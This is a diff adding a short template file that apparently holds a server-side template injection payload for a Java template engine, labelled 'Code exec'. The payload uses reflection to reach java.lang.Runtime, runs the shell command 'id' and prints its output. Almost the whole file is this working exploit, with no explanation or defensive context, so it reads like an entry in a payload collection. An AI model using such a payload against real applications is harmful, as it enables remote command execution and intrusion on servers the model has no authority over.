@@ -1,0 +1,15 @@
+{{ someString.toUPPERCASE() }}
+
+//Code exec
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
